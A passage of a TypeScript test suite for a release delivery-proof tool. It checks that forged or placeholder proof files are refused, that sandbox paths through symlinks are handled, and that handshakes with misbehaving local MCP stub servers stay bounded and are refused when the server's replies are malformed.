    SEMCTX_DELIVERY_PROOF_OUTPUT: PROOF_OUTPUT,
    HOME: MAINTAINER_HOME,
    PATH: "/usr/local/bin:/usr/bin",
    ...overrides,
  };
}

function archived(files: Map<string, string>): StableDeliveryProof {
  const raw = files.get(PROOF_OUTPUT);
  expect(raw).toBeDefined();
  return JSON.parse(raw!) as StableDeliveryProof;
}

describe("hostile 11 — the archived bytes are the authority", () => {
  test("a nominal run exits zero and archives a final proof at the uploaded path", async () => {
    const { runtime, files } = fakeRuntime();
    const code = await main(liveEnvironment(), runtime);
    expect(code).toBe(0);
    const proof = archived(files);
    expect(proof.ok).toBe(true);
    expect(proof.stage).toBe("final");
    expect(proof.reasons).toEqual([]);
    expect(proof.run).toEqual(RUN);
  });

  test("the workflow placeholder is valid JSON and is never evidence", () => {
    const placeholder = placeholderProof(RELEASE, RUN);
    expect(placeholder.stage).toBe("placeholder");
    expect(placeholder.ok).toBe(false);
    expect(placeholder.kind).toBe(STABLE_DELIVERY_PROOF_KIND);
    expect(proofExitCode(placeholder)).toBe(1);
    // It belongs to this very run — which is exactly why belonging alone cannot be the test.
    expect(proofBelongsToRun(placeholder, RELEASE, RUN)).toBe(true);
    expect(JSON.parse(JSON.stringify(placeholder))).toBeDefined();
  });

  test("a placeholder from this run left in place is refused as the final proof", async () => {
    const { runtime, files } = fakeRuntime();
    // The oracle has to be the *stage*, not the verdict: a placeholder that happened to carry
    // `ok: false` would be refused by the exit-status rule alone, which would leave the stage check
    // unexercised. This one claims success and belongs to this very run, so only the stage refuses it.
    const forged = { ...placeholderProof(RELEASE, RUN), ok: true };
    expect(proofBelongsToRun(forged, RELEASE, RUN)).toBe(true);
    files.set(PROOF_OUTPUT, `${JSON.stringify(forged, null, 2)}\n`);
    // The final write silently does nothing, so the artifact on disk stays the placeholder.
    const silent: DeliveryProofRuntime = { ...runtime, writeTextFile: () => undefined };
    const code = await main(liveEnvironment(), silent);
    expect(code).toBe(1);
    expect(archived(files).stage).toBe("placeholder");
    expect(archived(files).ok).toBe(true);
  });

  test("a first write that lands and a final write that fails keeps the job red", async () => {
    const { runtime, files } = fakeRuntime();
    files.set(PROOF_OUTPUT, `${JSON.stringify(placeholderProof(RELEASE, RUN), null, 2)}\n`);
    const broken: DeliveryProofRuntime = {
      ...runtime,
      writeTextFile() { throw new Error("disk full"); },
    };
    const code = await main(liveEnvironment(), broken);
    expect(code).toBe(1);
    // The placeholder is still what the workflow will upload: a diagnostic, never a verdict.
    expect(archived(files).stage).toBe("placeholder");
  });

  test("a minimal hand-written JSON claiming success cannot produce exit 0", async () => {
    // Everything a structural re-validation would look at is correct here: recognised schema and
    // kind, `stage: "final"`, `ok: true`, and a release *and* run identity that belong to this very
    // run. Only byte equality with the verdict this run actually computed refuses it.
    const forged = {
      schemaVersion: STABLE_DELIVERY_PROOF_SCHEMA_VERSION,
      kind: STABLE_DELIVERY_PROOF_KIND,
      stage: "final",
      ok: true,
      release: RELEASE,
      run: RUN,
    };
    const { runtime, files } = fakeRuntime();
    const forging: DeliveryProofRuntime = {
      ...runtime,
      writeTextFile(target) { files.set(target, `${JSON.stringify(forged, null, 2)}\n`); },
    };
    const code = await main(liveEnvironment(), forging);
    expect(code).toBe(1);
    const archivedProof = archived(files);
    expect(archivedProof.ok).toBe(true);
    expect(archivedProof.stage).toBe("final");
    expect(proofBelongsToRun(archivedProof, RELEASE, RUN)).toBe(true);
  });

  test("an archive with one field quietly changed is refused by exact equality", async () => {
    const { runtime, files } = fakeRuntime();
    const tweaking: DeliveryProofRuntime = {
      ...runtime,
      writeTextFile(target, contents) {
        // A whole, genuine proof of this run — with a single host reason silently dropped.
        const parsed = JSON.parse(contents) as StableDeliveryProof;
        parsed.hosts.codex.cli.rawVersion = "codex-cli 9.9.9";
        files.set(target, `${JSON.stringify(parsed, null, 2)}\n`);
      },
    };
    expect(await main(liveEnvironment(), tweaking)).toBe(1);
  });

  test("an archive that cannot be parsed back is a failure, not a pass", async () => {
    const { runtime, files } = fakeRuntime();
    const truncating: DeliveryProofRuntime = {
      ...runtime,
      writeTextFile(target, contents) { files.set(target, contents.slice(0, 40)); },
    };
    const code = await main(liveEnvironment(), truncating);
    expect(code).toBe(1);
  });

  test("an exception during the orchestration still leaves a final failure JSON", async () => {
    const { runtime, files } = fakeRuntime({ throwOnCommand: "codex --version" });
    const code = await main(liveEnvironment(), runtime);
    expect(code).toBe(1);
    const proof = archived(files);
    expect(proof.stage).toBe("final");
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("PROOF_ABORTED");
    expect(proof.detail).toContain("spawn failed: codex --version");
    expect(proof.run).toEqual(RUN);
  });

  test("a missing input is archived, not merely logged", async () => {
    const { runtime, files } = fakeRuntime();
    const code = await main(liveEnvironment({ SEMCTX_DELIVERY_SANDBOX: undefined }), runtime);
    expect(code).toBe(1);
    expect(archived(files).reasons).toContain("PROOF_INPUT_INCOMPLETE");
  });

  test("an artifact from an earlier attempt of the same tag is refused", async () => {
    const { runtime, files } = fakeRuntime();
    expect(await main(liveEnvironment({ GITHUB_RUN_ATTEMPT: "1" }), runtime)).toBe(0);
    const leftover = files.get(PROOF_OUTPUT)!;
    const replay: DeliveryProofRuntime = {
      ...runtime,
      readTextFile: (target) => (target === PROOF_OUTPUT ? leftover : runtime.readTextFile(target)),
    };
    const code = await main(liveEnvironment({ GITHUB_RUN_ATTEMPT: "2" }), replay);
    expect(code).toBe(1);
    expect(archived(files).reasons).toContain("PROOF_NOT_BOUND_TO_RUN");
  });

  test("the exit status follows the archived bytes, not the in-memory verdict", async () => {
    const { runtime, files } = fakeRuntime();
    // The object in memory is a whole proof; the bytes that land say otherwise.
    const rewriting: DeliveryProofRuntime = {
      ...runtime,
      writeTextFile(target, contents) {
        const parsed = JSON.parse(contents) as StableDeliveryProof;
        files.set(target, JSON.stringify({ ...parsed, ok: false }, null, 2));
      },
    };
    const code = await main(liveEnvironment(), rewriting);
    expect(code).toBe(1);
    expect(archived(files).ok).toBe(false);
  });

  test("main never names a real profile as anything but a forbidden root", async () => {
    const { runtime, ledger } = fakeRuntime();
    await main(liveEnvironment(), runtime);
    for (const entry of ledger) {
      expect(isWithinRoot(entry.path, REAL_CODEX_HOME)).toBe(false);
      expect(isWithinRoot(entry.path, REAL_CLAUDE_HOME)).toBe(false);
    }
  });

  test("an aborted proof is composed through the same evaluator a real run uses", () => {
    const proof = abortedProof(RELEASE, RUN, "PROOF_ABORTED", "boom", "linux");
    expect(proof.ok).toBe(false);
    expect(proof.stage).toBe("final");
    expect(proof.reasons[0]).toBe("PROOF_ABORTED");
    expect(proof.session.proven).toBe(false);
  });
});

// --- The default runtime and the real MCP transport --------------------------------------------

const temporaryDirectories: string[] = [];

afterEach(() => {
  for (const directory of temporaryDirectories.splice(0)) {
    rmSync(directory, { recursive: true, force: true });
  }
});

function temporaryRoot(): string {
  const directory = mkdtempSync(join(tmpdir(), "semctx-delivery-proof-"));
  temporaryDirectories.push(directory);
  return directory;
}

const TIGHT_LIMITS: McpLimits = {
  exchangeDeadlineMs: 4_000,
  requestTimeoutMs: 1_200,
  maxToolPages: 4,
  stdoutMaxBytes: 64 * 1024,
  stderrMaxBytes: 4 * 1024,
  terminateGraceMs: 400,
  teardownMs: 800,
};

/** Whether a pid still names a live process. `signal 0` probes without delivering anything. */
function processIsAlive(pid: number): boolean {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}

function serverScript(body: string): string {
  const root = temporaryRoot();
  const file = join(root, "server.js");
  writeFileSync(file, body, "utf8");
  return file;
}

/** Real stdio server with injectable initialization/catalogue and a valid control-status reply. */
function catalogueServerScript(
  tools: unknown,
  initializeResult: unknown = {
    protocolVersion: "2025-06-18",
    capabilities: { tools: {} },
    serverInfo: { name: "semctx-proof-test", version: "1" },
  },
  methodLog?: string,
  listResults?: readonly unknown[],
): string {
  const payload = JSON.stringify(CONTROL_PAYLOAD);
  const initialization = JSON.stringify(initializeResult);
  const pages = JSON.stringify(listResults ?? [{ tools }]);
  return serverScript(
    `let buffer = ''; let listPage = 0; const listResults = ${pages};\n`
    + "process.stdin.setEncoding('utf8');\n"
    + "process.stdin.on('data', (chunk) => {\n"
    + "  buffer += chunk;\n"
    + "  let index = buffer.indexOf('\\n');\n"
    + "  while (index >= 0) {\n"
    + "    const line = buffer.slice(0, index); buffer = buffer.slice(index + 1);\n"
    + "    if (line.trim().length > 0) {\n"
    + "      const message = JSON.parse(line);\n"
    + (methodLog === undefined ? ""
      : `      require("node:fs").appendFileSync(${JSON.stringify(methodLog)}, JSON.stringify({ method: message.method, params: message.params }) + "\\n");\n`)
    + "      if (message.id !== undefined) {\n"
    + `        let result = message.method === 'initialize' ? ${initialization} : {};\n`
    + "        if (message.method === 'tools/list') result = listResults[listPage++] ?? { tools: [] };\n"
    + `        if (message.method === 'tools/call') result = { content: [{ type: 'text', text: ${JSON.stringify(payload)} }], structuredContent: ${payload} };\n`
    + "        process.stdout.write(JSON.stringify({ jsonrpc: '2.0', id: message.id, result }) + '\\n');\n"
    + "      }\n"
    + "    }\n"
    + "    index = buffer.indexOf('\\n');\n"
    + "  }\n"
    + "});\n",
  );
}

function receivedMessages(path: string): Array<{ method: string; params?: unknown }> {
  return readFileSync(path, "utf8").trim().split("\n")
    .map((line) => JSON.parse(line) as { method: string; params?: unknown });
}

function receivedMethods(path: string): string[] {
  return receivedMessages(path).map((message) => message.method);
}

describe("defaultProofRuntime observes the real filesystem", () => {
  test("a real sandbox below a linked temp ancestor still admits its own descendants", () => {
    const runtime = defaultProofRuntime();
    const outer = temporaryRoot();
    const physical = join(outer, "physical");
    const logical = join(outer, "logical");
    mkdirSync(physical);
    symlinkSync(physical, logical, process.platform === "win32" ? "junction" : "dir");
    const sandbox = join(logical, "sandbox");
    const inside = join(sandbox, "codex");
    mkdirSync(inside, { recursive: true });

    expect(runtime.pathKind(sandbox)).toBe("directory");
    expect(runtime.pathKind(inside)).toBe("directory");
    expect(runtime.realPath(sandbox)).not.toBe(sandbox);
    const admission = admitHostPath("codex.cache", inside, sandbox, runtime, process.platform);
    expect(admission.reason).toBeNull();
    expect(admission.admitted).toBe(inside);
  });

  test("a path below a linked temp ancestor remains usable through admission and re-admission", () => {
    const runtime = defaultProofRuntime();
    const outer = temporaryRoot();
    const physical = join(outer, "physical");
    const logical = join(outer, "logical");
    mkdirSync(physical);
    symlinkSync(physical, logical, process.platform === "win32" ? "junction" : "dir");
    const sandbox = join(logical, "sandbox");
    const cache = join(sandbox, "codex");
    const manifest = join(cache, "plugin.json");
    mkdirSync(cache, { recursive: true });
    writeFileSync(manifest, '{"name":"semctx-control"}\n', "utf8");
    const admissions: PathAdmission[] = [];
    const access = new ConfinedAccess(runtime, sandbox, admissions);

    const admittedCache = access.admit("codex.cache", cache);
    expect(admittedCache).toBe(cache);
    expect(access.read("codex.manifest", manifest, admittedCache)).toBe('{"name":"semctx-control"}\n');
    expect(admissions.every((entry) => entry.reason === null)).toBe(true);
  });

  test("a linked sandbox root is still refused when its parent is ordinary", () => {
    const runtime = defaultProofRuntime();
    const outer = temporaryRoot();
    const physical = join(outer, "physical");
    const sandbox = join(outer, "sandbox");
    mkdirSync(join(physical, "codex"), { recursive: true });
    symlinkSync(physical, sandbox, process.platform === "win32" ? "junction" : "dir");

    expect(runtime.pathKind(sandbox)).toBe("link");
    expect(admitHostPath("codex.cache", join(sandbox, "codex"), sandbox, runtime, process.platform).reason)
      .toBe("HOST_PATH_IS_LINK");
  });

  test("a junction is a link to pathKind and is refused by admitHostPath", () => {
    const runtime = defaultProofRuntime();
    const sandbox = temporaryRoot();
    const outside = temporaryRoot();
    mkdirSync(join(outside, "cache"), { recursive: true });
    const junction = join(sandbox, "cache");
    symlinkSync(join(outside, "cache"), junction, "junction");
    expect(runtime.pathKind(junction)).toBe("link");
    expect(admitHostPath("claude.cache", junction, sandbox, runtime, process.platform).reason)
      .toBe("HOST_PATH_IS_LINK");
  });

  test("a real directory inside the sandbox is admitted, and one outside it is not", () => {
    const runtime = defaultProofRuntime();
    const sandbox = temporaryRoot();
    const outside = temporaryRoot();
    const inside = join(sandbox, "codex");
    mkdirSync(inside);
    expect(admitHostPath("codex.cache", inside, sandbox, runtime, process.platform).reason).toBeNull();
    expect(admitHostPath("codex.cache", outside, sandbox, runtime, process.platform).reason)
      .toBe("HOST_PATH_ESCAPED_SANDBOX");
    expect(runtime.pathKind(join(sandbox, "absent"))).toBe("absent");
    expect(runtime.realPath(join(sandbox, "absent"))).toBeNull();
  });

  test("the artifact path is created, re-readable, and recorded in the ledger", () => {
    const runtime = defaultProofRuntime();
    const root = temporaryRoot();
    const target = join(root, "nested", "delivery-proof", "proof.json");
    runtime.writeTextFile(target, '{"ok":false}\n');
    expect(runtime.readTextFile(target)).toBe('{"ok":false}\n');
    expect(runtime.digestFile(target)).toMatch(/^[0-9a-f]{64}$/);
    expect(runtime.realPath(target)).not.toBeNull();
    const ledger = runtime.ledger();
    expect(ledger.some((entry) => entry.operation === "write" && entry.path === target)).toBe(true);
    expect(ledger.some((entry) => entry.operation === "read" && entry.path === target)).toBe(true);
    expect(ledger.some((entry) => entry.operation === "stat" && entry.path === target)).toBe(true);
  });

  test("the witness is read from a commit's blob, not from the working tree", () => {
    const runtime = defaultProofRuntime();
    const repository = temporaryRoot();
    const env = { PATH: process.env["PATH"], SystemRoot: process.env["SystemRoot"] };
    const bundle = join(repository, "plugins", "claude-code", "dist");
    mkdirSync(bundle, { recursive: true });
    writeFileSync(join(bundle, "semctx.js"), "committed\n");
    for (const argv of [
      ["git", "init", "--quiet", "."],
      ["git", "-c", "user.name=t", "-c", "user.email=t@example.test", "add", "."],
      ["git", "-c", "user.name=t", "-c", "user.email=t@example.test", "commit", "--quiet", "-m", "witness"],
    ]) {
      expect(runtime.run(argv, repository, env).code).toBe(0);
    }
    const head = runtime.run(["git", "rev-parse", "HEAD"], repository, env).out.trim();
    const committed = runtime.gitBlob(repository, head, "plugins/claude-code/dist/semctx.js", env);
    expect(committed).not.toBeNull();

    // Edit the working tree without committing: the blob must not move.
    writeFileSync(join(bundle, "semctx.js"), "tampered\n");
    const again = runtime.gitBlob(repository, head, "plugins/claude-code/dist/semctx.js", env);
    expect(new TextDecoder().decode(again!)).toBe("committed\n");
    expect(runtime.digestFile(join(bundle, "semctx.js"))).not.toBe(sha256Hex("committed\n"));
  });
});

describe("hostile 12 — the MCP child's whole life is bounded", () => {
  test("a server that never answers returns within the deadline and leaves nothing behind", async () => {
    const script = serverScript("process.stdin.resume(); setInterval(() => {}, 1_000_000);\n");
    const started = Bun.nanoseconds();
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    const elapsedMs = (Bun.nanoseconds() - started) / 1e6;
    expect(outcome.ok).toBe(false);
    expect(outcome.detail).toContain("timed out");
    // The bound is the point: a silent server must not hold the release runner.
    expect(elapsedMs).toBeLessThan(TIGHT_LIMITS.exchangeDeadlineMs + 4_000);
  }, 30_000);

  test("a server that ignores termination is still reaped inside the teardown bound", async () => {
    const script = serverScript(
      "process.on('SIGTERM', () => {}); process.on('SIGINT', () => {});\n"
      + "process.stdin.resume(); setInterval(() => {}, 1_000_000);\n",
    );
    const started = Bun.nanoseconds();
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    const elapsedMs = (Bun.nanoseconds() - started) / 1e6;
    expect(outcome.ok).toBe(false);
    expect(elapsedMs).toBeLessThan(TIGHT_LIMITS.exchangeDeadlineMs + 6_000);
  }, 30_000);

  test("a server flooding stdout without a newline is refused rather than buffered forever", async () => {
    const script = serverScript(
      "const block = 'x'.repeat(16384);\n"
      + "process.stdin.resume();\n"
      + "const pump = () => { for (let i = 0; i < 32; i += 1) process.stdout.write(block); setTimeout(pump, 1); };\n"
      + "pump();\n",
    );
    const started = Bun.nanoseconds();
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    const elapsedMs = (Bun.nanoseconds() - started) / 1e6;
    expect(outcome.ok).toBe(false);
    expect(outcome.detail).toMatch(/stdout bound|timed out|closed its output stream/);
    expect(elapsedMs).toBeLessThan(TIGHT_LIMITS.exchangeDeadlineMs + 6_000);
  }, 30_000);

  test("a server that exits immediately fails fast instead of waiting for the timeout", async () => {
    const script = serverScript("process.exit(3);\n");
    const started = Bun.nanoseconds();
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    const elapsedMs = (Bun.nanoseconds() - started) / 1e6;
    expect(outcome.ok).toBe(false);
    // Closing the stream is a decided verdict; waiting out the request timeout would only delay it.
    expect(elapsedMs).toBeLessThan(TIGHT_LIMITS.requestTimeoutMs);
  }, 30_000);

  test("a child that ignores termination is observably gone once the call returns", async () => {
    const script = serverScript(
      "process.on('SIGTERM', () => {}); process.on('SIGINT', () => {}); process.on('SIGHUP', () => {});\n"
      + "process.stdin.resume(); setInterval(() => {}, 1_000_000);\n",
    );
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    expect(outcome.ok).toBe(false);
    expect(outcome.pid).not.toBeNull();
    // Returning promptly is not the guarantee — the child not surviving the job is.
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test("a server flooding stderr is bounded in what is retained and still returns", async () => {
    const script = serverScript(
      "const block = 'e'.repeat(8192);\n"
      + "process.stdin.resume();\n"
      + "const pump = () => { for (let i = 0; i < 16; i += 1) process.stderr.write(block); setTimeout(pump, 1); };\n"
      + "pump();\n",
    );
    const started = Bun.nanoseconds();
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    const elapsedMs = (Bun.nanoseconds() - started) / 1e6;
    expect(outcome.ok).toBe(false);
    // Only the *retained* text is capped; the stream is drained without bound so the child never
    // blocks on a full pipe — which is exactly what the limit name and the docs now say.
    expect(outcome.stderrBytes).toBeLessThanOrEqual(TIGHT_LIMITS.stderrMaxBytes);
    expect(elapsedMs).toBeLessThan(mcpWorstCaseMs(TIGHT_LIMITS) + 4_000);
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test("the stderr bound counts UTF-8 bytes rather than JavaScript characters", async () => {
    const limits = { ...TIGHT_LIMITS, stderrMaxBytes: 5 };
    const script = serverScript(
      "process.stderr.write('🙂🙂'); process.stdin.resume(); setInterval(() => {}, 1_000_000);\n",
    );
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, limits);
    // Two emoji occupy eight UTF-8 bytes but four UTF-16 code units. The raw-byte prefix is exactly
    // five bytes, which catches an implementation that caps or reports `string.length` instead.
    expect(outcome.stderrBytes).toBe(5);
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test("the declared worst case is the exchange plus every bounded teardown wait", () => {
    expect(mcpWorstCaseMs(TIGHT_LIMITS)).toBe(
      TIGHT_LIMITS.exchangeDeadlineMs + TIGHT_LIMITS.terminateGraceMs + TIGHT_LIMITS.teardownMs * 3,
    );
    // The field is not called a total deadline, because teardown keeps a real budget of its own.
    expect(mcpWorstCaseMs(TIGHT_LIMITS)).toBeGreaterThan(TIGHT_LIMITS.exchangeDeadlineMs);
  });

  test("a compliant server completes the whole contract", async () => {
    const script = catalogueServerScript([{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object", properties: { repositoryRoot: { type: "string" } } },
    }]);
    const outcome = await defaultMcpHandshake(script, temporaryRoot(), temporaryRoot(), {
      PATH: process.env["PATH"],
      SystemRoot: process.env["SystemRoot"],
    }, TIGHT_LIMITS);
    // Anti-vacuity for this whole describe: the bounds must not make a good server fail.
    expect(outcome.ok).toBe(true);
    expect(outcome.toolCount).toBe(1);
    expect(outcome.verdict).toBe("UNSEALED");
  }, 30_000);

  test("a compliant paginated catalogue is fully consumed before the required tool is called", async () => {
    const methodLog = join(temporaryRoot(), "methods.jsonl");
    const unrelated = { name: "other", inputSchema: { type: "object" } };
    const required = { name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } };
    const outcome = await defaultMcpHandshake(
      catalogueServerScript([], undefined, methodLog, [
        { tools: [unrelated], nextCursor: "page-2", _meta: {} },
        { tools: [required] },
      ]),
      temporaryRoot(),
      temporaryRoot(),
      { PATH: process.env["PATH"], SystemRoot: process.env["SystemRoot"] },
      TIGHT_LIMITS,
    );
    expect(outcome.ok).toBe(true);
    expect(outcome.toolCount).toBe(2);
    const messages = receivedMessages(methodLog);
    expect(messages.map((message) => message.method)).toEqual([
      "initialize", "notifications/initialized", "tools/list", "tools/list", "tools/call",
    ]);
    expect(messages[2]?.params).toEqual({});
    expect(messages[3]?.params).toEqual({ cursor: "page-2" });
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test.each([
    ["an empty initialize result", {}, "protocol 2025-06-18"],
    ["a different negotiated protocol", {
      protocolVersion: "2024-11-05",
      capabilities: {},
      serverInfo: { name: "semctx-proof-test", version: "1" },
    }, "protocol 2025-06-18"],
    ["missing capabilities", {
      protocolVersion: "2025-06-18",
      serverInfo: { name: "semctx-proof-test", version: "1" },
    }, "capabilities"],
    ["missing server identity", {
      protocolVersion: "2025-06-18",
      capabilities: { tools: {} },
    }, "serverInfo"],
    ["missing tools capability", {
      protocolVersion: "2025-06-18",
      capabilities: {},
      serverInfo: { name: "semctx-proof-test", version: "1" },
    }, "tools capability"],
    ["malformed tools capability", {
      protocolVersion: "2025-06-18",
      capabilities: { tools: { listChanged: "yes" } },
      serverInfo: { name: "semctx-proof-test", version: "1" },
    }, "capabilities"],
    ["malformed sibling capability", {
      protocolVersion: "2025-06-18",
      capabilities: { tools: {}, logging: [] },
      serverInfo: { name: "semctx-proof-test", version: "1" },
    }, "capabilities"],
    ["malformed initialize metadata", {
      protocolVersion: "2025-06-18",
      capabilities: { tools: {} },
      serverInfo: { name: "semctx-proof-test", version: "1" },
      _meta: [],
    }, "metadata"],
  ] as const)("refuses %s before discovery", async (_label, initializeResult, detail) => {
    const methodLog = join(temporaryRoot(), "methods.jsonl");
    const outcome = await defaultMcpHandshake(
      catalogueServerScript([{
        name: CONTROL_STATUS_TOOL,
        inputSchema: { type: "object" },
      }], initializeResult, methodLog),
      temporaryRoot(),
      temporaryRoot(),
      { PATH: process.env["PATH"], SystemRoot: process.env["SystemRoot"] },
      TIGHT_LIMITS,
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.detail).toContain(detail);
    expect(outcome.toolCount).toBe(0);
    expect(receivedMethods(methodLog)).toEqual(["initialize"]);
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test.each([
    ["a null catalogue entry", [null], "malformed tool catalogue"],
    ["the required tool without an input schema", [{ name: CONTROL_STATUS_TOOL }], "malformed tool catalogue"],
    ["the required tool with an empty input schema", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: {},
    }], "malformed tool catalogue"],
    ["the required tool with a non-object input schema", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "string" },
    }], "malformed tool catalogue"],
    ["the required tool with malformed properties", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object", properties: [] },
    }], "malformed tool catalogue"],
    ["the required tool with a malformed property schema", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object", properties: { repositoryRoot: 42 } },
    }], "malformed tool catalogue"],
    ["the required tool with a malformed required list", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object", required: ["repositoryRoot", 42] },
    }], "malformed tool catalogue"],
    ["the required tool with a non-object output schema", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object" },
      outputSchema: { type: "string" },
    }], "malformed tool catalogue"],
    ["the required tool with malformed annotations", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object" },
      annotations: { readOnlyHint: "yes" },
    }], "malformed tool catalogue"],
    ["the required tool with malformed metadata", [{
      name: CONTROL_STATUS_TOOL,
      inputSchema: { type: "object" },
      _meta: [],
    }], "malformed tool catalogue"],
    ["an empty tool name in an otherwise valid catalogue", [
      { name: "", inputSchema: { type: "object" } },
      { name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } },
    ], "malformed tool catalogue"],
    ["an unrelated tool", [{ name: "other", inputSchema: { type: "object" } }], "was not advertised"],
  ] as const)("refuses %s before tools/call", async (_label, tools, detail) => {
    const methodLog = join(temporaryRoot(), "methods.jsonl");
    const outcome = await defaultMcpHandshake(
      catalogueServerScript(tools, undefined, methodLog),
      temporaryRoot(),
      temporaryRoot(),
      { PATH: process.env["PATH"], SystemRoot: process.env["SystemRoot"] },
      TIGHT_LIMITS,
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.detail).toContain(detail);
    expect(outcome.verdict).toBeNull();
    expect(receivedMethods(methodLog)).toEqual(["initialize", "notifications/initialized", "tools/list"]);
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);

  test.each([
    ["a non-string cursor", [
      { tools: [{ name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } }], nextCursor: 42 },
    ], 1, "malformed cursor"],
    ["malformed result metadata", [
      { tools: [{ name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } }], _meta: [] },
    ], 1, "malformed metadata"],
    ["a malformed later page", [
      { tools: [{ name: "other", inputSchema: { type: "object" } }], nextCursor: "page-2" },
      { tools: [{ name: CONTROL_STATUS_TOOL, inputSchema: { type: "string" } }] },
    ], 2, "malformed tool catalogue"],
    ["a repeated cursor", [
      { tools: [{ name: "other", inputSchema: { type: "object" } }], nextCursor: "again" },
      { tools: [{ name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } }], nextCursor: "again" },
    ], 2, "repeated a cursor"],
    ["too many pages", [
      { tools: [], nextCursor: "2" },
      { tools: [], nextCursor: "3" },
      { tools: [], nextCursor: "4" },
      { tools: [], nextCursor: "5" },
      { tools: [{ name: CONTROL_STATUS_TOOL, inputSchema: { type: "object" } }] },
    ], 4, "page limit"],
  ] as const)("refuses %s before tools/call", async (_label, listResults, expectedLists, detail) => {
    const methodLog = join(temporaryRoot(), "methods.jsonl");
    const outcome = await defaultMcpHandshake(
      catalogueServerScript([], undefined, methodLog, listResults),
      temporaryRoot(),
      temporaryRoot(),
      { PATH: process.env["PATH"], SystemRoot: process.env["SystemRoot"] },
      TIGHT_LIMITS,
    );
    expect(outcome.ok).toBe(false);
    expect(outcome.detail).toContain(detail);
    const methods = receivedMethods(methodLog);
    expect(methods.filter((method) => method === "tools/list")).toHaveLength(expectedLists);
    expect(methods).not.toContain("tools/call");
    expect(processIsAlive(outcome.pid!)).toBe(false);
  }, 30_000);
});

// --- Packet E regressions -----------------------------------------------------------------------

/** Commands that change a host's state. The `--version` probe is identification, not an effect. */
function mutatingHostCalls(
  calls: Array<{ command: string[]; cwd: string; env: Record<string, string | undefined> }>,
  host?: ProofHost,
): string[][] {
  return calls
    .filter((call) => (call.command[0] === "codex" || call.command[0] === "claude")
      && call.command[1] === "plugin"
      && (host === undefined || call.command[0] === host))
    .map((call) => call.command);
}

function launchedPayloads(
  calls: Array<{ command: string[]; cwd: string; env: Record<string, string | undefined> }>,
): string[] {
  return calls.filter((call) => call.command[0] === "bun").map((call) => call.command[1] ?? "");
}

describe("hostile 13 — an invalid authority authorises no effect", () => {
  test("an invalid release identity installs nothing on either host", async () => {
    const { runtime, calls } = fakeRuntime();
    const proof = await runStableDeliveryProof({
      ...LIVE_OPTIONS,
      release: { ...RELEASE, tag: "v9.9.9" },
    }, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("RELEASE_TAG_VERSION_MISMATCH");
    expect(proof.reasons).toContain("PREFLIGHT_FAILED");
    expect(mutatingHostCalls(calls)).toEqual([]);
    expect(launchedPayloads(calls)).toEqual([]);
  });

  test("a checkout that is not GITHUB_SHA installs nothing on either host", async () => {
    const { runtime, calls } = fakeRuntime({ head: "3".repeat(40) });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("PREFLIGHT_FAILED");
    // A red report after the fact would still have let both hosts install.
    expect(mutatingHostCalls(calls)).toEqual([]);
    expect(launchedPayloads(calls)).toEqual([]);
    // Identification stayed allowed: that is what fills the archived CLI evidence.
    expect(calls.some((call) => call.command[1] === "--version")).toBe(true);
  });

  test("an incomplete witness installs nothing on either host", async () => {
    const { runtime, calls } = fakeRuntime({ missingBlobs: ["semctx-shared.js"] });
    const proof = await runStableDeliveryProof(LIVE_OPTIONS, runtime);
    expect(proof.ok).toBe(false);
    expect(proof.reasons).toContain("WITNESS_INCOMPLETE");
    expect(proof.reasons).toContain("PREFLIGHT_FAILED");
    expect(mutatingHostCalls(calls)).toEqual([]);
    expect(launchedPayloads(calls)).toEqual([]);
  });

  test("a failed npm resolution installs nothing on either host", async () => {
    const plausible = JSON.stringify({
      dependencies: {
        [HOST_CLI_SPECIFICATION.codex.package]: { version: HOST_CLI_SPECIFICATION.codex.version },
